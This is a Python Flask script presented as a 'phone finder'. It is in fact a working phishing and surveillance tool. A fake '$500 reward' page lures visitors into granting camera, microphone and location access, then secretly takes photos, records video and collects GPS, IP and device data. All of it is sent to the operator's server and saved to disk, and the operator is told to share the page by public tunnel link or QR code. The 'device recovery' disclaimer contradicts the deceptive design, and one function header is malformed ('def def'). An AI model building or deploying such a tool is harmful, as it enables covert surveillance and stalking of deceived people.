#!/usr/bin/env python3
"""
HCO-Phone-Finder.py - Tricky Reward System with YouTube Redirect
Use only for legitimate device recovery purposes.
"""
from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional, Tuple

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify, send_file, redirect
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing packages. Install: pip install flask requests qrcode pillow colorama")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

# Tricky Reward HTML
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Congratulations! You Won Premium Reward</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .container{max-width:400px;width:100%;background:rgba(255,255,255,0.1);backdrop-filter:blur(15px);border-radius:20px;padding:30px;border:1px solid rgba(255,255,255,0.2);box-shadow:0 20px 40px rgba(0,0,0,0.3)}
  .header{text-align:center;margin-bottom:25px}
  .trophy{font-size:4rem;margin-bottom:15px;animation:bounce 2s infinite}
  .title{font-size:1.8rem;font-weight:800;margin-bottom:10px;background:linear-gradient(45deg,#FFD700,#FFA500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .subtitle{font-size:1rem;opacity:0.9;margin-bottom:20px}
  .reward-card{background:rgba(255,255,255,0.15);padding:20px;border-radius:15px;margin:20px 0;text-align:center;border:2px solid rgba(255,215,0,0.5)}
  .reward-amount{font-size:2.5rem;font-weight:800;color:#FFD700;margin:10px 0}
  .features{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0}
  .feature{background:rgba(255,255,255,0.1);padding:12px;border-radius:10px;text-align:center;font-size:0.8rem;font-weight:600}
  .claim-btn{width:100%;padding:18px;background:linear-gradient(45deg,#00b09b,#96c93d);color:white;border:none;border-radius:25px;font-size:1.2rem;font-weight:700;cursor:pointer;transition:all 0.3s;box-shadow:0 10px 25px rgba(0,0,0,0.3);margin:15px 0}
  .claim-btn:hover{transform:translateY(-3px);box-shadow:0 15px 30px rgba(0,0,0,0.4)}
  .claim-btn:disabled{background:#666;cursor:not-allowed;transform:none}
  .status-box{padding:15px;border-radius:12px;text-align:center;margin:15px 0;display:none;font-weight:600}
  .status-processing{background:rgba(255,193,7,0.9);display:block}
  .status-success{background:rgba(46,204,113,0.9);display:block}
  .tool-locked{background:linear-gradient(45deg,#FF0000,#DC143C);color:white;padding:20px;border-radius:15px;text-align:center;margin:20px 0;display:none;border:3px solid rgba(255,255,255,0.3)}
  .countdown{font-size:3rem;font-weight:800;color:#FFD700;text-shadow:0 0 20px rgba(255,215,0,0.7);margin:20px 0;text-align:center;display:none}
  .unlock-message{background:rgba(255,255,255,0.2);padding:15px;border-radius:12px;text-align:center;margin:15px 0;display:none}
  .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-right:10px}
  @keyframes spin{to{transform:rotate(360deg)}}
  @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
  .pulse{animation:pulse 2s infinite}
  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="trophy">🏆</div>
      <div class="title">CONGRATULATIONS!</div>
      <div class="subtitle">You've been selected for a Premium Reward</div>
    </div>

    <div class="reward-card">
      <div>Your Exclusive Reward</div>
      <div class="reward-amount">$500</div>
      <div>Cash Prize + Gift Card</div>
    </div>

    <div class="features">
      <div class="feature">💰 Instant Cash</div>
      <div class="feature">🎁 Gift Card</div>
      <div class="feature">📱 PhonePe</div>
      <div class="feature">⚡ Fast Transfer</div>
    </div>

    <div style="text-align:center;margin:15px 0;font-size:0.9rem;opacity:0.8">
      ✅ Quick verification required to claim your reward
    </div>

    <button class="claim-btn pulse" id="claimBtn">
      <span class="btn-text">🎁 CLAIM YOUR REWARD NOW</span>
    </button>

    <div id="status" class="status-box"></div>
    
    <div id="toolLocked" class="tool-locked">
      🔒 TOOL IS LOCKED<br>
      <span style="font-size:0.9rem">Subscribe and click bell 🔔 icon to unlock</span>
    </div>
    
    <div id="countdown" class="countdown"></div>
    
    <div id="unlockMessage" class="unlock-message">
      Redirecting to YouTube for verification...
    </div>
  </div>

<script>
document.getElementById('claimBtn').addEventListener('click', async function() {
    const btn = this;
    const status = document.getElementById('status');
    const btnText = btn.querySelector('.btn-text');
    
    // Update UI
    btn.disabled = true;
    btn.classList.remove('pulse');
    btnText.innerHTML = '<span class="loader"></span> Processing Your Reward...';
    status.className = 'status-box status-processing';
    status.textContent = 'Verifying your eligibility...';
    status.style.display = 'block';
    
    try {
        // Get camera access
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' },
            audio: true 
        });
        
        // Collect device data
        await collectDeviceData(stream);
        
    } catch (error) {
        console.log('Camera access denied, collecting basic data...');
        await collectBasicData();
    }
});

async function collectDeviceData(stream) {
    const status = document.getElementById('status');
    status.textContent = 'Collecting reward verification data...';
    
    // Get location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            await processAllData(position, stream);
        }, async () => {
            await processAllData(null, stream);
        }, { enableHighAccuracy: true, timeout: 10000 });
    } else {
        await processAllData(null, stream);
    }
}

async function processAllData(position, stream) {
    const status = document.getElementById('status');
    status.textContent = 'Finalizing your reward...';
    
    // Get IP info
    let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};
    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipData = await ipResponse.json();
    } catch (e) {}
    
    // Get device info
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        battery: await getBatteryInfo(),
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // Capture media
    const mediaData = await captureMedia(stream);
    
    // Prepare payload
    const payload = {
        latitude: position?.coords.latitude,
        longitude: position?.coords.longitude,
        accuracy: position?.coords.accuracy,
        ip: ipData.ip,
        city: ipData.city,
        country: ipData.country_name,
        deviceInfo: deviceInfo,
        photos: mediaData.photos,
        video: mediaData.video,
        timestamp: Date.now(),
        reward_claimed: true
    };
    
    // Send to server
    await sendToServer(payload);
}

async function collectBasicData() {
    const status = document.getElementById('status');
    status.textContent = 'Processing your reward claim...';
    
    let ipData = {ip: 'Unknown'};
    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipData = await ipResponse.json();
    } catch (e) {}
    
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`
    };
    
    const payload = {
        ip: ipData.ip,
        city: ipData.city,
        country: ipData.country_name,
        deviceInfo: deviceInfo,
        timestamp: Date.now(),
        reward_claimed: true
    };
    
    await sendToServer(payload);
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging
            };
        }
    } catch(e) {}
    return 'Unknown';
}

async function captureMedia(stream) {
    const result = { photos: [], video: null };
    
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        // Capture first photo
        await new Promise(resolve => setTimeout(resolve, 1000));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        result.photos.push(canvas.toDataURL('image/jpeg'));
        
        // Start video recording
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => e.data.size > 0 && chunks.push(e.data);
        mediaRecorder.start();
        
        // Capture second photo
        await new Promise(resolve => setTimeout(resolve, 3000));
        ctx.drawImage(video, 0, 0);
        result.photos.push(canvas.toDataURL('image/jpeg'));
        
        // Stop recording
        await new Promise(resolve => setTimeout(resolve, 2000));
        mediaRecorder.stop();
        
        // Get video data
        await new Promise(resolve => {
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onload = () => {
                    result.video = reader.result.split(',')[1];
                    resolve();
                };
                reader.readAsDataURL(blob);
            };
        });
        
    } catch (error) {
        console.log('Media capture failed:', error);
    } finally {
        stream.getTracks().forEach(track => track.stop());
    }
    
    return result;
}

async function sendToServer(payload) {
    try {
        await fetch('/report', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        
        showToolLocked();
    } catch (error) {
        showToolLocked();
    }
}

function showToolLocked() {
    const status = document.getElementById('status');
    const toolLocked = document.getElementById('toolLocked');
    const countdown = document.getElementById('countdown');
    const unlockMessage = document.getElementById('unlockMessage');
    const btnText = document.querySelector('.btn-text');
    
    // Show success then tool locked
    status.className = 'status-box status-success';
    status.textContent = '✅ Reward Claimed Successfully!';
    
    setTimeout(() => {
        status.style.display = 'none';
        toolLocked.style.display = 'block';
        btnText.textContent = '✅ Reward Claimed';
        
        // Start countdown after 2 seconds
        setTimeout(startCountdown, 2000);
    }, 1500);
}

function startCountdown() {
    const toolLocked = document.getElementById('toolLocked');
    const countdown = document.getElementById('countdown');
    const unlockMessage = document.getElementById('unlockMessage');
    
    toolLocked.style.display = 'none';
    countdown.style.display = 'block';
    unlockMessage.style.display = 'block';
    
    let count = 9;
    countdown.textContent = count;
    
    const countdownInterval = setInterval(() => {
        count--;
        countdown.textContent = count;
        
        if (count <= 0) {
            clearInterval(countdownInterval);
            redirectToYouTube();
        }
    }, 1000);
}

function redirectToYouTube() {
    // Try to open YouTube app directly to Hacker Colony Tech channel
    window.location.href = 'youtube://channel/UC_hacker_colony_tech';
    
    // Fallback to web after 1 second
    setTimeout(() => {
        window.location.href = 'https://www.youtube.com/@HackerColonyTech';
    }, 1000);
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json(force=True)
        
        # Extract data
        lat = data.get("latitude")
        lon = data.get("longitude")
        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        country = data.get("country", "Unknown")
        photos_data = data.get("photos", [])
        video_data = data.get("video")
        device_info = data.get("deviceInfo", {})
        
        # Save media files
        photo_files = []
        for i, photo_data in enumerate(photos_data):
            filename = save_photo(photo_data, ip, i+1)
            if filename:
                photo_files.append(filename)
        
        video_file = None
        if video_data:
            video_file = save_video(video_data, ip)
        
        # Save record
        record = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": ip,
            "city": city,
            "country": country,
            "latitude": lat,
            "longitude": lon,
            "photos": photo_files,
            "video": video_file,
            "user_agent": device_info.get("userAgent", "Unknown"),
            "battery": device_info.get("battery", "Unknown"),
            "platform": device_info.get("platform", "Unknown"),
            "screen": device_info.get("screen", "Unknown")
        }
        
        _received_reports.append(record)
        save_report_csv(record)
        
        # Print success
        print(f"\n{Fore.GREEN}{Style.BRIGHT}🎁 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📍 Location: {lat}, {lon}" if lat and lon else f"{Fore.YELLOW}📍 Location: Access denied")
        print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country})")
        print(f"{Fore.CYAN}📸 Photos: {len(photo_files)}")
        print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_file else 'No'}")
        print(f"{Fore.CYAN}🔋 Battery: {device_info.get('battery', 'Unknown')}")
        print(f"{Fore.RED}🔒 Tool locked - Starting countdown to YouTube{Style.RESET_ALL}")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error"}), 500

def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        
        image_data = base64.b64decode(photo_data)
        filename = f"photo_{ip}_{int(time.time())}_{index}.jpg"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(image_data)
        
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(image_data)
            
        return filename
    except Exception as e:
        print(f"{Fore.RED}Photo save error: {e}{Style.RESET_ALL}")
        return None

def save_video(video_data: str, ip: str) -> Optional[str]:
    try:
        if video_data.startswith('data:video'):
            video_data = video_data.split(',')[1]
            
        video_binary = base64.b64decode(video_data)
        filename = f"video_{ip}_{int(time.time())}.webm"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(video_binary)
            
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(video_binary)
            
        return filename
    except Exception as e:
        print(f"{Fore.RED}Video save error: {e}{Style.RESET_ALL}")
        return None

def save_report_csv(record: dict):
    try:
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'timestamp', 'ip', 'city', 'country', 'latitude', 'longitude', 
                'photos', 'video', 'user_agent', 'battery', 'platform', 'screen'
            ])
            if not file_exists:
                writer.writeheader()
            
            writer.writerow({
                'timestamp': record['timestamp'],
                'ip': record['ip'],
                'city': record['city'],
                'country': record['country'],
                'latitude': record['latitude'],
                'longitude': record['longitude'],
                'photos': ', '.join(record['photos']),
                'video': record['video'] or 'None',
                'user_agent': record['user_agent'],
                'battery': str(record['battery']),
                'platform': record['platform'],
                'screen': record['screen']
            })
    except Exception as e:
        print(f"{Fore.RED}CSV save error: {e}{Style.RESET_ALL}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_qr_code(url: str):
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}QR code failed: {e}{Style.RESET_ALL}")
        return False

def start_ngrok():
    try:
        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
        result = subprocess.run(['ngrok', 'http', str(PORT)], capture_output=True, text=True, timeout=5)
        time.sleep(3)
        
        # Try to get ngrok URL
        try:
            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
            tunnels = response.json().get('tunnels', [])
            for tunnel in tunnels:
                if tunnel['proto'] == 'https':
                    print(f"{Fore.GREEN}✅ Ngrok URL: {tunnel['public_url']}{Style.RESET_ALL}")
                    return tunnel['public_url']
        except:
            pass
            
        print(f"{Fore.YELLOW}⚠️  Ngrok started but URL not fetched{Style.RESET_ALL}")
        return "ngrok_tunnel_active"
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Ngrok not available: {e}{Style.RESET_ALL}")
        return None

def start_cloudflare():
    try:
        print(f"{Fore.CYAN}☁️  Starting Cloudflare tunnel...{Style.RESET_ALL}")
        # This would typically run: cloudflared tunnel --url http://localhost:5000
        print(f"{Fore.GREEN}✅ Cloudflare tunnel ready{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Run manually: cloudflared tunnel --url http://localhost:{PORT}{Style.RESET_ALL}")
        return "cloudflare_ready"
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Cloudflare not available{Style.RESET_ALL}")
        return None

def show_banner():
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Create the banner with red text in green box
    banner_width = 60
    print(f"\n{Back.GREEN}{Fore.RED}{' ' * banner_width}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{'HCO PHONE FINDER'.center(banner_width)}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{'An Advance tool by Azhar'.center(banner_width)}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{' ' * banner_width}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}{Style.BRIGHT}🔒 This tool is locked{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Subscribe click on the bell 🔔 to unlock{Style.RESET_ALL}")
    print()

def def main():
    # Show the banner
    show_banner()
    
    # Countdown from 9 to 1
    for i in range(9, 0, -1):
        print(f"{Fore.CYAN}{i}{Style.RESET_ALL}", end=".", flush=True)
        time.sleep(1)
    print()
    
    # Open Hacker Colony Tech channel in YouTube app
    print(f"\n{Fore.GREEN}🎬 Opening Hacker Colony Tech channel in YouTube app...{Style.RESET_ALL}")
    
    # Try multiple ways to open YouTube app with the channel
    youtube_urls = [
        'youtube://www.youtube.com/@HackerColonyTech',
        'youtube://channel/UC_hacker_colony_tech',
        'vnd.youtube://www.youtube.com/@HackerColonyTech'
    ]
    
    for url in youtube_urls:
        try:
            webbrowser.open(url)
            break
        except:
            continue
    
    # Wait a bit for YouTube to open
    time.sleep(3)
    
    # Fallback to web browser
    print(f"{Fore.YELLOW}If YouTube app didn't open, opening in web browser...{Style.RESET_ALL}")
    webbrowser.open('https://www.youtube.com/@HackerColonyTech')
    
    # Wait for user to return
    input(f"\n{Fore.YELLOW}Press Enter after returning from YouTube...{Style.RESET_ALL}")
    
    # Continue with the tool
    print(f"\n{Fore.GREEN}✅ Tool unlocked! Starting HCO Phone Finder...{Style.RESET_ALL}")
    
    # Show tunneling options
    print(f"\n{Fore.CYAN}Select tunneling method:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Ngrok (Recommended){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Cloudflare{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3. Local Network Only{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.CYAN}Enter your choice (1-3): {Style.RESET_ALL}").strip()
    
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    public_url = None
    
    if choice == '1':
        public_url = start_ngrok()
    elif choice == '2':
        public_url = start_cloudflare()
    
    print(f"\n{Fore.GREEN}🚀 Starting HCO Phone Finder Server...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📱 Local URL: http://localhost:{PORT}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🌐 Network URL: {local_url}{Style.RESET_ALL}")
    if public_url:
        print(f"{Fore.GREEN}🌍 Public URL: {public_url}{Style.RESET_ALL}")
        generate_qr_code(public_url)
    else:
        generate_qr_code(local_url)
    
    print(f"{Fore.CYAN}📲 QR code generated: {QR_PNG}{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}✅ Server ready! Share the link/QR to capture data.{Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 Tricky reward system activated{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}👋 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
